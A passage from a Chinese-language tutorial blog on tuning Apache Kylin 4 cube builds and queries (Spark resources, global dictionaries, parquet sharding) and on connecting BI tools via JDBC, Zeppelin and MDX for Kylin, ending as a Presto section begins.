Cuboid 的数量，可以有效地控制 Cube 的膨胀率。</p><h3 id="5-3-Cube-构建参数调优">5.3 Cube 构建参数调优</h3><p>在 Kylin 4 中，Cube 构建作业中有两个步骤，第一步检测构建为 Cube 数据的源文件，第二步是构建快照表（如果需要），生成全局字典（如果需要）并将 Cube 数据构建为 Parquet文件。在第二步中，所有计算都是具有相对较重的负载的操作，因此除了使用衍生维度和聚合组来减少 Cube 的数量，使用正确的 Spark 资源和配置来构建 Cube 也非常重要</p><h4 id="使用适当的-Spark-资源和配置来构建-Cube">使用适当的 Spark 资源和配置来构建 Cube</h4><p>Kylin 构建参数全部以 kylin.engine.spark-conf 开头，以下表格中的参数省略开头</p><table><thead><tr><th><strong>参数</strong></th><th><strong>说明</strong></th></tr></thead><tbody><tr><td>spark.executor.instances</td><td>Spark 应用程序的 Executor 数量</td></tr><tr><td>spark.executor.cores</td><td>每个 Executor 使用的核心数，Executor 数量乘以Executor 使用的核心数就是 Spark 程序运行的最大并行度</td></tr><tr><td>spark.executor.memory</td><td>每个 Executor 使用的内存</td></tr><tr><td>spark.executor.memoryOverhead</td><td>每个 Executor 使用的堆外内存</td></tr><tr><td>spark.sql.files.maxPartitionBytes</td><td>读取文件时要打包到单个分区中的最大字节数，默认值为 128M。如果源表（Hive source）中有许多小文件，spark 会自动将许多小文件打包到单个分区中，以避免执行太多的小任务</td></tr><tr><td>spark.sql.shuffle.partitions</td><td>配置为联接 Join 或聚合 Shuffle 时要使用的分区数，默认值为 200。较大的值需要更多的 CPU 资源，而较小的值需要更多的内存资源</td></tr></tbody></table><p><strong>Kylin 根据 Cube 情况自动设置 Spark 参数</strong></p><p>Kylin 4 将使用以下分配规则来自动设置 Spark 资源和配置，所有 Spark 资源和配置都是根据源文件中最大文件的大小以及 Cube 是否具有准确的去重计数度量来设置的，这就是为什么我们需要在第一步中检测要构建多少个源文件的原因</p><ul><li><strong>Executor 内存规则</strong></li></ul><p>如 果 ${ 最 大 文 件 大 小 }&gt;=100G and ${ 存 在 准 确 去 重 度 量 值 }, 设 置<code>spark.executor.memory</code>为 20G；</p><p>如果{最大文件大小}&gt;=100G or (如果${最大文件大小}&gt;=10G and ${存在准确去重度量值}), 设置<code>spark.executor.memory</code>为 16G；</p><p>如果{最大文件大小}&gt;=10G or (如果${最大文件大小}&gt;=1G and ${存在准确去重度量值}), 设置<code>spark.executor.memory</code>为 10G；</p><p>如果{最大文件大小}&gt;=1G or ${存在准确去重度量值}, 设置<code>spark.executor.memory</code>为 4G；</p><p>否则设置<code>spark.executor.memory</code>为 1G</p><ul><li><strong>Executor 核心数规则</strong></li></ul><p>如果{最大文件大小}&gt;=10G or (如果${最大文件大小}&gt;=1G and ${存在准确去重度量值}), 设置<code>spark.executor.cores</code>为5；否则设置<code>spark.executor.cores</code>为 1</p><ul><li><strong>Executor 堆外内存规则</strong></li></ul><p>如 果 ${ 最 大 文 件 大 小 }&gt;=100G and ${ 存 在 准 确 去 重 度 量 值 }, 设 置<code>spark.executor.memoryOverhead</code>为 6G；所以这种情况下，每个 Executor 的内存为 20G + 6G= 26G;</p><p>如果{最大文件大小}&gt;=100G or (如果${最大文件大小}&gt;=10G and ${存在准确去重度量值}), 设置<code>spark.executor.memoryOverhead</code>为 4G；</p><p>如果{最大文件大小}&gt;=10G or (如果${最大文件大小}&gt;=1G and ${存在准确去重度量值}), 设置<code>spark.executor.memoryOverhead</code>为 2G；</p><p>如果{最大文件大小}&gt;=1G or ${存在准确去重度量值}, 设置<code>spark.executor.memoryOverhead</code>为 1G；</p><p>否则设置<code>spark.executor.memoryOverhead</code>为 1G</p><ul><li><strong>Executor 实例数量规则</strong></li></ul><p>①读取参数’kylin.engine.base-executor-instance’的值作为基本 Executor 数量，默认值为 5</p><p>② 根 据 Cuboid 个 数 来 计 算 所 需 的 Executor 个 数 ， 配 置 文 件 中 读 取 参 数’kylin.engine.executor-instance-strategy’的值，默认为’100,2,500,3,1000,4’，即Cuboid 个数为 0-100 时，因数为 1；100-500 时，因数为 2；500-1000 时，因数为 3；1000 以上时，因数为 4。然后用这个因数乘以第一步的基本 Executor 数量就是 Executor 的预估总数量</p><p>③从 Yarn 资源池中的得到可用的总核心数和总内存数，然后用总核心数和总内存数除以 kylin 任务所需的核心数和内存数，两者求个最小值，就是 Executor 的可用总量</p><p>④最后在 Executor 的预估总数量和 Executor 的可用总数量之间取最小值作为Executor的实际最终总数量</p><ul><li><strong>Shuffle 分区数量规则</strong></li></ul><p>设置<code>spark.sql.shuffle.partitions</code>为max(2, ${最大文件大小 MB} / 32)。在应用上述所有分配规则后，可以在&quot;kylin.log&quot;文件中找到一些日志消息</p><p><strong>根据实际情况手动设置 Spark 参数</strong></p><p>根据 Kylin 自动调整的配置值，如果仍存在一些 Cube 构建性能问题，可以适当更改这些配置的值以进行尝试</p><p>如果您从 spark ui 观察到某些任务中存在严重的 GC 现象，或者发现大量 executor丢失或获取失败错误，您可以更改这两个配置的值，以增加每个 executor 的内存</p><ul><li>spark.executor.memory=</li><li>spark.executor.memoryOverhead=</li></ul><p>一般调整策略是将参数的值调整为 2 倍。如果问题解决了，您可以适当地调整以避免浪费资源。在增加每个 Executor 的内存后，如果仍有严重的内存问题，可以考虑调整<code>spark.executor.cores</code>为 1，此调整可以使单个任务是每个 Executor 的独家任务，并且执行效率相对较低，但它可以通过这种方式来避免构建失败</p><p>如果您从 spark ui 观察到，有大量任务需要为多轮计划（每轮都用掉了所有内核），您可以更改这两个配置的值，以增加 spark 应用程序的内核数</p><ul><li>spark.executor.cores=</li><li>spark.executor.instances=</li></ul><p>如果有一些 Executor 丢失或获取数据错误，并且仅仅因为 Shuffle 期间的减速器数量太小，或者数据倾斜，可以尝试增加<code>spark.sql.shuffle.partitions</code>的值</p><ul><li>spark.sql.shuffle.partitions=</li></ul><h4 id="全局字典构建性能调优">全局字典构建性能调优</h4><p><strong>全局字典介绍</strong></p><blockquote><p><a href="https://cwiki.apache.org/confluence/display/KYLIN/Global+Dictionary+on+Spark" target="_blank" rel="noopener" title="https://cwiki.apache.org/confluence/display/KYLIN/Global+Dictionary+on+Spark">https://cwiki.apache.org/confluence/display/KYLIN/Global+Dictionary+on+Spark</a></p></blockquote><p>在 OLAP 数据分析领域，根据去重结果的要求分为近似去重和精确去重，而精确去重是一种非常常见的要求。Kylin 使用预计算技术来加速大数据分析。在 Cube 的增量构建过程中，为了避免由于对不同时间段分别构造字典而导致最终去重结果出现错误，一个 Cube 中的所有 segments 将使用同一个字典，即全局字典，原理如下</p><ul><li>每个构建任务都将生成一个新的全局字典</li><li>每个新的构建任务的字典会根据版本号保存，旧的全局字典会逐渐删除</li><li>一个全局字典包含一个元数据文件和多个字典文件，每个字典文件称为一个 bucket</li><li>每个 bucket 被划分为两个映射(Map&lt;Object, Long&gt;)，并将这两个映射组合成一个完整的映射关系</li></ul><p><strong>调优参数</strong></p><p>如果 cube 定义了精确去重（即 count(distinct)语法）的度量值，Kylin4.0 将基于 Spark 为这些度量值<strong>分布式</strong>地构建全局字段的值（之前版本是单点构建）。这部分的优化主要是调整一个参数</p><ul><li>kylin.dictionary.globalV2-threshold-bucket-size (默认值 500000)</li></ul><p>如果 CPU 资源充足，减少此配置的值可以减少单个分区中的数据量，从而加快构建全局字典</p><p><strong>使用全局字典</strong></p><p>在 已 有 的 Model 中 ， 创 建 一 个 新 的 Cube 用 于 测 试 全 局 字 典 ， 在<strong>Measures</strong>界面设 置 度 量 为<strong>COUNT_DISTINCT</strong>，返回<strong>类型选择 Precisely</strong>。如果构建失败，可能是 yarn 资源限制，构建时单个容器申请的 cpu 核数超过 yarn 单个容器默认最大 4 核（4核跑不起来），修改 hadoop 的 <code>yarn-site.xml</code>，分发配置文件，重启 yarn，然后就可以在hdfs上查看dict文件了</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 容器允许分配的最大 cpu 核数--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.scheduler.maximum-allocation-vcores<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>8<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="快照表构建性能调优">快照表构建性能调优</h4><p>Snapshot Table - 快照表：每一张快照表对应一个 Hive 维度表，为了实时记录 Hive 维度表的数据变化，Kylin 的 cube 每次构建都会对 hive 维度表创建一个新的快照，以下是快照表的调优参数。构建 Snapshot table 时，主要调整 2 个参数来调优</p><table><thead><tr><th><strong>参数名</strong></th><th><strong>默认值</strong></th><th><strong>说明</strong></th></tr></thead><tbody><tr><td>kylin.snapshot.parallel-build-enabled</td><td>true</td><td>使用并行构建，保持开启</td></tr><tr><td>kylin.snapshot.shard-size-mb</td><td>128MB</td><td>如果 CPU 资源充足，可以减少值来增加并行度，建议并行度在 Spark 应用CPU 核数的 3 倍以内。并行度=原表数据量/该参数</td></tr></tbody></table><h2 id="6、查询性能优化">6、查询性能优化</h2><p>在 Kylin4.0 中，查询引擎(SparderContext)也使用 spark 作为计算引擎，它是真正的分布式查询引擎，特别是在复杂查询方面，性能会优于 Calcite。然而，仍然有许多关键性能点需要优化。除了上面提到的设置适当的计算资源之外，它还包括减少小的或不均匀的文件，设置适当的分区，以及尽可能多地修剪 parquet 文件。Kylin4.0 和 Spark 提供了一些优化策略来提高查询性能</p><h3 id="6-1-使用排序列快速读取-parquet-文件">6.1 使用排序列快速读取 parquet 文件</h3><p>创建 cube 时，可以指定维度列的排序，当保存 cube 数据时，每个 cuboid 的第一个维度列将用于执行排序操作。其目的是在使用排序列进行查询时，通过 parquet 文件的最小最大索引尽可能地过滤不需要的数据。在cube里的advance setting里，rowkey 的顺序就是排序顺序，页面中可以左键点击 ID 进行拖拽，调整顺序</p><h3 id="6-2-使用-shardby-列来裁剪-parquet-文件">6.2 使用 shardby 列来裁剪 parquet 文件</h3><p>Kylin4.0 底层存储使用的是 Parquet 文件，并且 Parquet 文件在存储的时候是会按照某一列进行分片的。这个分片的列在 Kylin 里面，我们称为是 shardBy 列，Kylin 默认按照 shardBy列进行分片，分片能够使查询引擎跳过不必要的文件，提高查询性能。我们在创建 Cube 时可以指定某一列作为 shardBy 列，最好选择高基列（基数高的列），并且会在多个 cuboid 中出现的列作为 shardBy 列。</p><p>我们按照时间（月）过滤，生成对应的 Segment，然后按照维度 A 作为shardBy 列进行分片，每个 Segment 里面都会有相应的分片。如果我们在查询的时候按照时间和维度 A 进行过滤，Kylin 就会直接选择对应 Segment 的对应分片，大大的提升的查询效率</p><p><img src="http://qnypic.shawncoding.top/blog/202404151825597.png" alt></p><p>查询时,查询引擎可以通过日期分区列过滤出 segment-level 目录,并通过 cuboid 过滤出cuboid-level 目录。但是在 cuboid-level 目录中仍有许多 parquet 文件,可以使用 shard by 列进一步裁剪parquet文件。目前在SQL查询中只支持以下过滤操作来裁剪parquet文件：Equality、In、InSet、IsNull。</p><p>操作方式是在构建cube时点击advance setting，在rowKeys选择需要的列，将 shardby 改成 true即可。当构建 cube 数据时，它会根据这个 shard 按列对 parquet 文件进行重分区。如果没有指定一个 shardby 的列，则对所有列进行重分区</p><h3 id="6-3-减少小的或不均匀的-parquet-文件">6.3 减少小的或不均匀的 parquet 文件</h3><p>在查询时读取太多小文件或几个太大的文件会导致性能低下，为了避免这个问题，Kylin4.0 在将 cube 数据作为 parquet 文件构建时，会按照一定策略对 parquet 文件进行重分区，以减少小的或不均匀的 parquet 文件</p><h4 id="相关配置">相关配置</h4><table><thead><tr><th><strong>参数名</strong></th><th><strong>默认值</strong></th><th><strong>说明</strong></th></tr></thead><tbody><tr><td>kylin.storage.columnar.shard-size-mb</td><td>128MB</td><td>有 shardby 列的 parquet 文件最大大小</td></tr><tr><td>kylin.storage.columnar.shard-rowcount</td><td>2500000</td><td>每个 parquet 文件最多包含的行数</td></tr><tr><td>kylin.storage.columnar.shard-countdistinct-rowcount</td><td>1000000</td><td>指定 cuboid 的 bitmap 大小</td></tr><tr><td>kylin.storage.columnar.repartition-threshold-size-mb</td><td>128MB</td><td>每个 parquet 文件的最大大小</td></tr></tbody></table><h4 id="重分区的检查策略">重分区的检查策略</h4><ul><li>如果这个 cuboid 有 shardBy 的列;</li><li>parquet 文件的平均大小 &lt; 参数<code>kylin.storage.columnar.repartition-threshold-size-mb</code>值 ，且 parquet 文件数量大于 1;这种情况是为了避免小文件太多;</li><li>parquet 文件的数量 &lt; (parquet 文件的总行数/ <code>kylin.storage.columnar.shard-rowcount</code> * 0.75)，如果这个 cuboid 有精确去重的度量值(即 count(distinct))，使用<code>kylin.storage.columnar.shard-countdistinct-rowcount</code>来代替 <code>kylin.storage.columnar.shard-rowcount</code>;这种情况是为了避免不均匀的文件;</li></ul><p>如果满足上述条件之一，它将进行重分区，分区的数量是这样计算的:</p><ul><li>${fileLengthRepartitionNum} =Math.ceil(${parquet 文件大小 MB} / ${kylin.storage.columnar.shard-size-mb})</li><li>${rowCountRepartitionNum} =Math.ceil(${parquet 文件总行数} / ${kylin.storage.columnar.shard-rowcount})</li><li>分区数量=Math.ceil(( ${fileLengthRepartitionNum} + ${ rowCountRepartitionNum } ) / 2)</li></ul><h4 id="合理调整参数的方式">合理调整参数的方式</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看重分区的信息，可以通过下面命令去 log 中查找</span></span><br><span class="line">grep <span class="string">"Before repartition, cuboid"</span> logs/kylin.log</span><br><span class="line"><span class="comment"># 比如官方案例：可以看到分区数有 809 个</span></span><br><span class="line"><span class="comment"># 增大kylin.storage.columnar.shard-rowcount</span></span><br><span class="line"><span class="comment"># 或 kylin.storage.columnar.shard-countdistinct-rowcount的值，重新构建，查看日志：</span></span><br><span class="line"><span class="comment"># 可以看到：分区数变成了 3 个，构建的时间也从 58 分钟降低到 24 分钟</span></span><br></pre></td></tr></table></figure><h3 id="6-4-将多个小文件读取到同一个分区">6.4 将多个小文件读取到同一个分区</h3><p>当已经构建的 segments中有很多小文件时，可以 修改参数<code>spark.sql.files.maxPartitionBytes</code>(默认值为 128MB)为合适的值，这样可以让 spark 引擎将一些小文件读取到单个分区中，从而避免需要太多的小任务</p><p>如 果 有 足 够 的 资 源 ， 可 以 减 少 该参数 的 值 来 增 加 并 行 度 ， 但 需 要 同 时 减 少<code>spark.hadoop.parquet.block.size</code>(默认值为 128MB)的值，因为 parquet 文件的最小分割单元是RowGroup，这个 blocksize 参数表示 parquet 的 RowGroup 的最大大小</p><h3 id="6-5-使用堆外内存">6.5 使用堆外内存</h3><p>Spark 可以直接操作堆外内存，减少不必要的内存开销，减少频繁的 GC，提高处理性能</p><table><thead><tr><th>spark.memory.offHeap.enabled</th><th>设置为 true，使用堆外内存进行 spark shuffle</th></tr></thead><tbody><tr><td>spark.memory.offHeap.size</td><td>堆外内存的大小</td></tr></tbody></table><h2 id="7、BI-工具集成">7、BI 工具集成</h2><h3 id="7-1-JDBC">7.1 JDBC</h3><p>首先引入对应版本依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.kylin<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>kylin-jdbc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>查询创建</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    <span class="comment">//Kylin_JDBC 驱动</span></span><br><span class="line">    String KYLIN_DRIVER = <span class="string">"org.apache.kylin.jdbc.Driver"</span>;</span><br><span class="line">    <span class="comment">//Kylin_URL</span></span><br><span class="line">    String KYLIN_URL = <span class="string">"jdbc:kylin://hadoop102:7070/FirstProject"</span>;</span><br><span class="line">    <span class="comment">//Kylin 的用户名</span></span><br><span class="line">    String KYLIN_USER = <span class="string">"ADMIN"</span>;</span><br><span class="line">    <span class="comment">//Kylin 的密码</span></span><br><span class="line">    String KYLIN_PASSWD = <span class="string">"KYLIN"</span>;</span><br><span class="line">    <span class="comment">//添加驱动信息</span></span><br><span class="line">    Class.forName(KYLIN_DRIVER);</span><br><span class="line">    <span class="comment">//获取连接</span></span><br><span class="line">    Connection connection =</span><br><span class="line">            DriverManager.getConnection(KYLIN_URL, KYLIN_USER, KYLIN_PASSWD);</span><br><span class="line">    <span class="comment">//预编译 SQL</span></span><br><span class="line">    PreparedStatement ps = connection.prepareStatement(<span class="string">"select dname,sum(sal) from emp e join dept d on e.deptno = d.deptno group by dname"</span>);</span><br><span class="line">    <span class="comment">//执行查询</span></span><br><span class="line">    ResultSet resultSet = ps.executeQuery();</span><br><span class="line">    <span class="comment">//遍历打印</span></span><br><span class="line">    <span class="keyword">while</span> (resultSet.next()) &#123;</span><br><span class="line">        System.out.println(resultSet.getString(<span class="number">1</span>)+<span class="string">":"</span>+resultSet.getDouble(<span class="number">2</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="7-2-Zepplin">7.2 Zepplin</h3><blockquote><p>官网：<a href="https://zeppelin.apache.org/download.html" target="_blank" rel="noopener" title="https://zeppelin.apache.org/download.html">https://zeppelin.apache.org/download.html</a></p></blockquote><p>Zeppelin是一个基于Web的notebook，提供交互数据分析和可视化。后台支持接入多种数据处理引擎，如spark，hive等。支持多种语言： Scala(Apache Spark)、Python(Apache Spark)、SparkSQL、 Hive、 Markdown、Shell等</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ================安装与启动======================</span></span><br><span class="line"><span class="comment"># 下载，需要科学</span></span><br><span class="line">wget https://dlcdn.apache.org/zeppelin/zeppelin-0.10.1/zeppelin-0.10.1-bin-all.tgz</span><br><span class="line"><span class="comment"># 解压</span></span><br><span class="line">tar -zxvf zeppelin-0.10.1-bin-all.tgz -C /opt/module/</span><br><span class="line"><span class="built_in">cd</span> /opt/module/</span><br><span class="line">mv zeppelin-0.10.1-bin-all/ zeppelin</span><br><span class="line"><span class="comment"># 因为可能端口冲突，建议修改</span></span><br><span class="line">mv conf/zeppelin-site.xml.template conf/zeppelin-site.xml</span><br><span class="line"><span class="comment"># 然后里面修改ip为hadoop102以及修改端口为8989，自己选一个不冲突的即可</span></span><br><span class="line"><span class="comment"># 启动，zeppelin.sh是前台启动</span></span><br><span class="line">bin/zeppelin-daemon.sh start</span><br><span class="line"><span class="comment"># 可登录网页查看，web 默认端口号为 8080。 http://hadoop102:8080</span></span><br><span class="line"><span class="comment"># 服务名称为ZeppelinServer</span></span><br></pre></td></tr></table></figure><p>然后配置 Zepplin 支持 Kylin，登陆成功后，点击右上角 anonymous 选择 <strong>Interpreter</strong>，搜索 Kylin 插件并修改相应的配置(ip域名和项目名字，这里默认是kylin用户名密码)</p><p>保存成功后，点击create note，注意要选择kylin引擎，创建成功后，即可享受和jupyter类似的笔记式查询</p><h2 id="8、MDX-For-Kylin">8、MDX For Kylin</h2><blockquote><p>文档：<a href="https://kyligence.github.io/mdx-kylin/zh-hans/" target="_blank" rel="noopener" title="https://kyligence.github.io/mdx-kylin/zh-hans/">https://kyligence.github.io/mdx-kylin/zh-hans/</a></p></blockquote><h3 id="8-1-概述">8.1 概述</h3><blockquote><p>Mondrian、MDX 相关含义：<a href="https://segmentfault.com/a/1190000007782683" target="_blank" rel="noopener" title="https://segmentfault.com/a/1190000007782683">https://segmentfault.com/a/1190000007782683</a></p></blockquote><p>MDX for Kylin 是基于 Mondrian 二次开发的、由 Kyligence 贡献的、使用 ApacheKylin 作为数据源的 MDX 查询引擎 。MDX for Kylin 的使用体验比较接近 Microsoft SSAS，可以集成多种数据分析工具，包括 Microsoft Excel、Tableau 等，可以为大数据分析场景下提供更极致的体验</p><p>MDX for Kylin 是在决策支持和业务分析中使用的分析数据引擎。MDX for Kylin 助力消除数据孤岛，统一数据口径，提高数据业务转化效率，提升运营决策能力。</p><p>MDX for Kylin 相对其它开源 MDX 查询引擎，具有以下优势：</p><ul><li>更好支持 BI (Excel/Tableau/Power BI 等) 产品，适配 XMLA 协议；</li><li>针对 BI 的 MDX Query 进行了特定优化重写；</li><li>适配 Kylin 查询，通过 Kylin 的预计算能力加速 MDX 查询；</li><li>通过简洁易懂的操作界面，提供了统一的指标定义和管理能力。</li></ul><h3 id="8-2-mdx的安装与使用">8.2 mdx的安装与使用</h3><p>MDX for Kylin 需要对接一个 Kylin 实例或集群，现在 MDX for Kylin 能对接 Kylin版本为 4.0.2 及以上。如果使用的kylin是小于4.0.2的需要替换一个jar包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 上传 kylin-server-base-4.0.1.jar 包，覆盖原有 jar 包</span></span><br><span class="line"><span class="comment"># 可以参考https://github.com/Kyligence/mdx-kylin/issues/1#issue-1174836123</span></span><br><span class="line">cp /opt/software/kylin-server-base-4.0.1.jar /opt/module/kylin-4.0.1/tomcat/webapps/kylin/WEB-INF/lib</span><br><span class="line"><span class="comment"># 重启 kylin</span></span><br><span class="line">bin/kylin.sh restart</span><br><span class="line"><span class="comment"># 如果版本正常就不需要管</span></span><br><span class="line"><span class="comment"># 同时需要的依赖环境</span></span><br><span class="line"><span class="comment"># JAVA 环境：JDK8 或以上，推荐的元数据库驱动 jar 版本，mysql-connector-java-8.0.16, 请下载到 &lt;MDX for Kylin 安装目录&gt;/semantic-mdx/lib/ 下或者替换所需的 mysql connector 版本到该路径下</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装mdx前需要首先创建元数据库</span></span><br><span class="line"><span class="comment"># MySQL 创建数据库</span></span><br><span class="line">create database mdx default character <span class="built_in">set</span> utf8mb4 collate utf8mb4_unicode_ci;</span><br><span class="line"><span class="comment"># 注意：将 character_set_database 设定为 utf8mb4 或 utf8, 将 collation_server 设定为utf8mb4_unicode_ci 或 utf8_unicode_ci</span></span><br><span class="line"></span><br><span class="line">tar -zxvf mdx-for-kylin-1.0.0-beta.tar.gz -C /opt/module</span><br><span class="line">wget https://s3.cn-north-1.amazonaws.com.cn/public.kyligence.io/kylin/tar/mdx-for-kylin-1.0.0-beta.tar.gz</span><br><span class="line">tar -zxvf mdx-for-kylin-1.0.0-beta.tar.gz -C /opt/module</span><br><span class="line"><span class="comment"># 加密元数据库访问密码</span></span><br><span class="line">bin/mdx.sh encrypt <span class="string">'123456'</span></span><br><span class="line"><span class="comment"># 注意：如果输入的密码包含特殊字符, 需要用单引号包裹, 如果密码里面有单引号, 那么可以用双引号包裹。</span></span><br><span class="line"><span class="comment"># 记录加密后的密文：698d2c7907fc9b6dbe7f8a8c4cb0297a</span></span><br><span class="line"><span class="comment"># 修改配置文件,修改 conf 目录下 insight.properties 配置</span></span><br><span class="line">vim conf/insight.properties</span><br><span class="line"><span class="comment"># 修改一下参数</span></span><br><span class="line">insight.kylin.host=hadoop102</span><br><span class="line">insight.kylin.port=7070</span><br><span class="line">insight.database.type=mysql</span><br><span class="line">insight.database.ip=hadoop102</span><br><span class="line">insight.database.port=3306</span><br><span class="line">insight.database.name=mdx</span><br><span class="line">insight.database.username=root</span><br><span class="line">insight.database.password=698d2c7907fc9b6dbe7f8a8c4cb0297a</span><br><span class="line">insight.mdx.cluster.nodes=hadoop102:7080</span><br><span class="line"><span class="comment"># 注意：password 是前面加密后的密文</span></span><br><span class="line"><span class="comment"># 然后复制jdbc驱动到lib目录</span></span><br><span class="line">cp /opt/software/mysql-connector-java-5.1.37.jar /opt/module/mdx-for-kylin-1.0.0-beta/semantic-mdx/lib/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动 MDX For Kylin</span></span><br><span class="line"><span class="comment"># 首次启动会需要几分钟的时间来更新元数据</span></span><br><span class="line">bin/mdx.sh start</span><br><span class="line"><span class="comment"># 注意：在首次启动时，由于未并未填写与 Kylin 通信的账户信息，所以同步任务会失败。详情如下图，此时可正常登陆 MDX for Kylin 并填写同步信息，填写后即可正常同步</span></span><br><span class="line"><span class="comment"># 安装成功后，通过 http://hadoop102:7080/login/ 登陆 MDX for Kylin，密码和 Kylin 一样，默认是 ADMIN/KYLIN。</span></span><br><span class="line"><span class="comment"># 然后输入同步的kylin用户名密码，同样是输入 ADMIN/KYLIN</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 停止 MDX for Kylin</span></span><br><span class="line">bin/mdx.sh stop</span><br></pre></td></tr></table></figure><h3 id="8-3-设计数据集">8.3 设计数据集</h3><p>打开 mdx 的 Web UI，创建数据集：<a href="http://hadoop102:7080" target="_blank" rel="noopener">http://hadoop102:7080</a>，随便输入数据集名称后下一步，拖拽模型到右侧画布(注意是启动的cube才显示)，修改维度和度量（名称、属性，<a href="https://kylin.apache.org/cn/docs/tutorial/quick_start_for_mdx.html" target="_blank" rel="noopener" title="更多修改维度和度量属性的操作">更多修改维度和度量属性的操作</a>），定义翻译，确定保存</p><h3 id="8-4-excel分析数据">8.4 excel分析数据</h3><p>打开 Excel，设置获取数据</p><p><img src="http://qnypic.shawncoding.top/blog/202404151825598.png" alt></p><p>填写参数，名称的格式为:<code>http://{host}:{port}/mdx/xmla/{project}</code></p><p><img src="http://qnypic.shawncoding.top/blog/202404151825599.png" alt></p><p>选择数据库和表，保存文件并完成</p><p><img src="http://qnypic.shawncoding.top/blog/202404151825600.png" alt></p><p>然后单元格选择导入数据，选择数据透视图，完成即可分析了</p><h1>二、Presto</h1><h2 id="1、Presto简介">1、Presto简介</h2><h3 id="1-1-概述">1.1 概述</h3><p>Presto是一个开源的分布式SQL查询引擎，数据量支持GB到PB字节，主要用来处理秒级查询的场景。注意:虽然Presto可以解析SQL，但它不是一个标准的数据库。不是MySQL、Oracle的代替品，也不能用来处理在线事务（OLTP ) 。</p><h3 id="1-2-Presto架构">1.2 Presto架构</h3><p><img src="http://qnypic.shawncoding.top/blog/202404151825601.png" alt></p><h3 id="1-3-Presto优缺点">1.3 Presto优缺点</h3><p><img src="http://qnypic.shawncoding.top/blog/202404151825602.png" alt></p><h3 id="1-4-Presto、Impala性能比较">1.4 Presto、Impala性能比较</h3><blockquote><p><a href="https://blog.csdn.net/u012551524/article/details/79124532" target="_blank" rel="noopener" title="https://blog.csdn.net/u012551524/article/details/79124532">https://blog.csdn.net/u012551524/article/details/79124532</a></p></blockquote><p>测试结论：Impala性能稍领先于Presto，但是Presto在数据源支持上非常丰富，包括Hive、图数据库、传统关系型数据库、Redis等</p><h2 id="2、Presto安装">2、Presto安装</h2><blockquote><p>官网：<a href="https://prestodb.io/getting-started.html" target="_blank" rel="noopener" 